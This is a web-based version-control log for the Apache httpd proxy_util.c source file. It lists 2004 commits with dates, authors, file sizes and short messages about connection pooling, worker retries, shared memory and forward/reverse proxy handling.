([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=106103&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=106103))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=106103)

Modified
*Sun Nov 21 18:50:36 2004 UTC*
(20 years, 2 months ago)
by *nd*

File length: 59362 byte(s)

Diff to [previous 105480](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105480&r2=106103)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105480&r2=106103&diff_format=h))
```
general property cleanup

```

---

Revision [**105480**](/viewvc?view=revision&revision=105480) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105480&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105480&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105480))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105480)

Modified
*Sat Oct 16 06:52:35 2004 UTC*
(20 years, 3 months ago)
by *mturk*

File length: 59362 byte(s)

Diff to [previous 105345](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105345&r2=105480)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105345&r2=105480&diff_format=h))
```
Do not use reslist if it wasn't created. This fixes cases on prefork with
threads enabled and hmax set.

```

---

Revision [**105345**](/viewvc?view=revision&revision=105345) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105345&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105345&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105345))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105345)

Modified
*Wed Sep 29 19:05:44 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 59343 byte(s)

Diff to [previous 105320](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105320&r2=105345)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105320&r2=105345&diff_format=h))
```
Add server_rec to initialize_worker_share so that it get's
correctly.

```

---

Revision [**105320**](/viewvc?view=revision&revision=105320) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105320&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105320&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105320))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105320)

Modified
*Tue Sep 28 16:54:29 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 58945 byte(s)

Diff to [previous 105318](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105318&r2=105320)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105318&r2=105320&diff_format=h))
```
Reformat code to no tab and no CR-LF

```

---

Revision [**105318**](/viewvc?view=revision&revision=105318) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105318&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105318&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105318))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105318)

Modified
*Tue Sep 28 16:35:29 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 59809 byte(s)

Diff to [previous 105293](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105293&r2=105318)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105293&r2=105318&diff_format=h))
```
Make sure that we don't increase balancer worker count on
gracefull restart. Thanks to Christian...again.

```

---

Revision [**105293**](/viewvc?view=revision&revision=105293) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105293&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105293&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105293))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105293)

Modified
*Sun Sep 26 06:54:27 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 58116 byte(s)

Diff to [previous 105177](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105177&r2=105293)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105177&r2=105293&diff_format=h))
```
Remove proxy_runtime_worker and make the things simpler by
sharing runtime status accross child processes. Also make sure
that shared data is initialized after the scoreboard is created.

```

---

Revision [**105177**](/viewvc?view=revision&revision=105177) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105177&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105177&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105177))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105177)

Modified
*Fri Sep 17 08:00:20 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57259 byte(s)

Diff to [previous 105136](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105136&r2=105177)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105136&r2=105177&diff_format=h))
```
Make worker retry algorithm much  simpler removing incremental
timeout increase.

```

---

Revision [**105136**](/viewvc?view=revision&revision=105136) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105136&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105136&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105136))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105136)

Modified
*Wed Sep 15 12:20:19 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57502 byte(s)

Diff to [previous 105132](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105132&r2=105136)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105132&r2=105136&diff_format=h))
```
Fix worker retries and limit default retry timeout to 10 minutes.
Thanks to Christian von Roques for spotting that.

```

---

Revision [**105132**](/viewvc?view=revision&revision=105132) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105132&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105132&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105132))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105132)

Modified
*Wed Sep 15 11:57:02 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57338 byte(s)

Diff to [previous 105110](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105110&r2=105132)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105110&r2=105132&diff_format=h))
```
Register output function so that core can retrieve it and set
scoreboard accordingly

```

---

Revision [**105110**](/viewvc?view=revision&revision=105110) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105110&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105110&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105110))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105110)

Modified
*Mon Sep 13 11:36:24 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57377 byte(s)

Diff to [previous 105109](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105109&r2=105110)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105109&r2=105110&diff_format=h))
```
Fix typo -- uri is constructed when there is no proxy in chain.

```

---

Revision [**105109**](/viewvc?view=revision&revision=105109) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105109&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105109&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105109))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105109)

Modified
*Mon Sep 13 11:30:22 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57376 byte(s)

Diff to [previous 105108](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105108&r2=105109)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105108&r2=105109&diff_format=h))
```
No need to allocate hostname on each request for
persistent connections.

```

---

Revision [**105108**](/viewvc?view=revision&revision=105108) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105108&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105108&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105108))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105108)

Modified
*Mon Sep 13 11:13:28 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57293 byte(s)

Diff to [previous 105073](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105073&r2=105108)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105073&r2=105108&diff_format=h))
```
Always use prive connection pool for allocation, and call
apr_pool_clear when the connection is closed on recycle, so
that we don't leak on persistent connections.

```

---

Revision [**105073**](/viewvc?view=revision&revision=105073) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105073&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105073&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105073))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105073)

Modified
*Sat Sep 11 10:50:05 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57239 byte(s)

Diff to [previous 105070](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105070&r2=105073)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105070&r2=105073&diff_format=h))
```
Use worker as a parameter for connection_constructor.
When min connections is greater then zero connstructor is
called when the reslist is created.

```

---

Revision [**105070**](/viewvc?view=revision&revision=105070) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105070&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105070&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105070))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105070)

Modified
*Sat Sep 11 09:31:10 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57285 byte(s)

Diff to [previous 105069](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105069&r2=105070)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105069&r2=105070&diff_format=h))
```
Do not add forward proxy to other proxies. Use new function to
create the worker that isn't by default added to the list of other workers.
This enalbles mixing forward and reverse proxy functionality on the same box.

```

---

Revision [**105069**](/viewvc?view=revision&revision=105069) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105069&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105069&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105069))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105069)

Modified
*Sat Sep 11 09:12:26 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57067 byte(s)

Diff to [previous 105068](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105068&r2=105069)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105068&r2=105069&diff_format=h))
```
Remove the unused close_connection function.

```

---

Revision [**105068**](/viewvc?view=revision&revision=105068) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105068&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105068&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105068))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105068)

Modified
*Sat Sep 11 09:08:00 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57361 byte(s)

Diff to [previous 105064](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105064&r2=105068)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105064&r2=105068&diff_format=h))
```
Make sure that the connection pool cleanup is called before
the reslist is destroyed.

```

---

Revision [**105064**](/viewvc?view=revision&revision=105064) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105064&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105064&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105064))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105064)

Modified
*Fri Sep 10 18:29:16 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57209 byte(s)

Diff to [previous 105059](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105059&r2=105064)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105059&r2=105064&diff_format=h))
```
Just like for balancers initialize the workers on post_config
instead on first request to skip the race condition.

```

---

Revision [**105059**](/viewvc?view=revision&revision=105059) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105059&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105059&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105059))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105059)

Modified
*Fri Sep 10 14:32:11 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 57562 byte(s)

Diff to [previous 105057](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105057&r2=105059)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105057&r2=105059&diff_format=h))
```
Remove the proxy_conn_cleanup. The socket will be closed
when the pool is cleared or destroyed by it's own cleanup routine.
Also skip clearing sockets if the workers pool is destroyed, cause
the pool might already be destroyed.

```

---

Revision [**105057**](/viewvc?view=revision&revision=105057) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105057&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105057&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105057))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105057)

Modified
*Fri Sep 10 08:16:25 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 58061 byte(s)

Diff to [previous 105056](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105056&r2=105057)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105056&r2=105057&diff_format=h))
```
Move the shared scoreboard data initization to the balancer module.
The initialization is done like for the worker, on first request.
This is done because during config phase we don't have a scoreboard
to allocate from. Thanks to Chritian von Roques for spotting that.

```

---

Revision [**105056**](/viewvc?view=revision&revision=105056) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105056&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105056&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105056))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105056)

Modified
*Thu Sep 9 19:57:29 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 59723 byte(s)

Diff to [previous 105050](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105050&r2=105056)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105050&r2=105056&diff_format=h))
```
Remove unneeded variable. No functional change.

```

---

Revision [**105050**](/viewvc?view=revision&revision=105050) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105050&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105050&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105050))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105050)

Modified
*Thu Sep 9 16:14:41 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 59764 byte(s)

Diff to [previous 105049](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105049&r2=105050)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105049&r2=105050&diff_format=h))
```
Make sure that the status is not overwritten.

```

---

Revision [**105049**](/viewvc?view=revision&revision=105049) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105049&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105049&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105049))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105049)

Modified
*Thu Sep 9 15:54:50 2004 UTC*
(20 years, 4 months ago)
by *trawick*

File length: 59763 byte(s)

Diff to [previous 105048](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105048&r2=105049)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105048&r2=105049&diff_format=h))
```
spellcheck

```

---

Revision [**105048**](/viewvc?view=revision&revision=105048) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105048&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105048&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105048))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105048)

Modified
*Thu Sep 9 13:51:08 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 59762 byte(s)

Diff to [previous 105047](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105047&r2=105048)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105047&r2=105048&diff_format=h))
```
First try the reverse proxies. If there is no worker defined for
requested uri use the forward worker, but only for PROXYREQ_PROXY
requests.

```

---

Revision [**105047**](/viewvc?view=revision&revision=105047) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105047&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105047&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105047))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105047)

Modified
*Thu Sep 9 13:15:40 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 59861 byte(s)

Diff to [previous 105046](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105046&r2=105047)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105046&r2=105047&diff_format=h))
```
Add PROXY_WORKER_IGNORE_ERRORS flags that
disables puting the entire worker in retry mode, cause
for forward workers the remote is not fixed.

```

---

Revision [**105046**](/viewvc?view=revision&revision=105046) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105046&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105046&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105046))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105046)

Modified
*Thu Sep 9 13:03:06 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 59745 byte(s)

Diff to [previous 105045](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105045&r2=105046)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=105045&r2=105046&diff_format=h))
```
Add sockaddr to proxy_conn_rec. Using the workers address
is unsafe for forward proxy workers, cause unlike reverse
proxies the forward can have each connection with different
remote address.

```

---

Revision [**105045**](/viewvc?view=revision&revision=105045) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105045&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=105045&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=105045))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=105045)

Modified
*Thu Sep 9 10:26:29 2004 UTC*
(20 years, 4 months ago)
by *mturk*

File length: 59630 byte(s)

Diff to [previous 104708](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104708&r2=105045)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104708&r2=105045&diff_format=h))
```
Use forward worker for all PROXYREQ_PROXY requests.

```

---

Revision [**104708**](/viewvc?view=revision&revision=104708) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104708&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104708&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104708))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104708)

Modified
*Wed Aug 18 13:34:17 2004 UTC*
(20 years, 5 months ago)
by *minfrin*

File length: 59078 byte(s)

Diff to [previous 104646](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104646&r2=104708)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104646&r2=104708&diff_format=h))
```
Fix some compiler warnings in proxy
PR:
Obtained from:
Submitted by:	Geoffrey Young <geoff@modperlcookbook.org>
Reviewed by:

```

---

Revision [**104646**](/viewvc?view=revision&revision=104646) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104646&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104646&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104646))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104646)

Modified
*Fri Aug 13 12:20:53 2004 UTC*
(20 years, 5 months ago)
by *trawick*

File length: 59001 byte(s)

Diff to [previous 104628](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104628&r2=104646)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104628&r2=104646&diff_format=h))
```
axe some unused variables and don't log an error code that
hasn't been initialized

```

---

Revision [**104628**](/viewvc?view=revision&revision=104628) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104628&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104628&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104628))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104628)

Modified
*Wed Aug 11 23:30:54 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 59080 byte(s)

Diff to [previous 104625](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104625&r2=104628)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104625&r2=104628&diff_format=h))
```
Fix setting of hostname for backend.
The now reflects the real name withouth scheme:// prefix.

Submitted by: mturk

```

---

Revision [**104625**](/viewvc?view=revision&revision=104625) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104625&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104625&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104625))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104625)

Modified
*Wed Aug 11 23:10:35 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 59068 byte(s)

Diff to [previous 104624](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104624&r2=104625)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104624&r2=104625&diff_format=h))
```
Added dynamic worker limit. It ensures that the addng dynamic
workers to the balancers never excedes that limit.

Submitted by: mturk

```

---

Revision [**104624**](/viewvc?view=revision&revision=104624) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104624&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104624&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104624))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104624)

Modified
*Wed Aug 11 23:09:57 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 58552 byte(s)

Diff to [previous 104619](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104619&r2=104624)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104619&r2=104624&diff_format=h))
```
Add some extra debugging to ease the bug chasing :)

Submitted by: mturk

```

---

Revision [**104619**](/viewvc?view=revision&revision=104619) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104619&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104619&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104619))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104619)

Modified
*Wed Aug 11 23:05:59 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 57421 byte(s)

Diff to [previous 104617](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104617&r2=104619)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104617&r2=104619&diff_format=h))
```
Implement the worker retry functionality.
It uses either worker->retry option or default 60 second retry
that is on each revolution extended by another 60 seconds.

Submitted by: mturk

```

---

Revision [**104617**](/viewvc?view=revision&revision=104617) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104617&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104617&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104617))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104617)

Modified
*Wed Aug 11 23:02:53 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 55793 byte(s)

Diff to [previous 104611](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104611&r2=104617)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104611&r2=104617&diff_format=h))
```
Shared memory support. The shared memory is inside
apache scoreboard. If it ever gets back ported we could use it on 2.0

Submitted by: mturk

```

---

Revision [**104611**](/viewvc?view=revision&revision=104611) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104611&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104611&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104611))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104611)

Modified
*Wed Aug 11 22:56:51 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 54921 byte(s)

Diff to [previous 104610](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104610&r2=104611)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104610&r2=104611&diff_format=h))
```
Add route and redirect to worker so they can be set trough configuration.
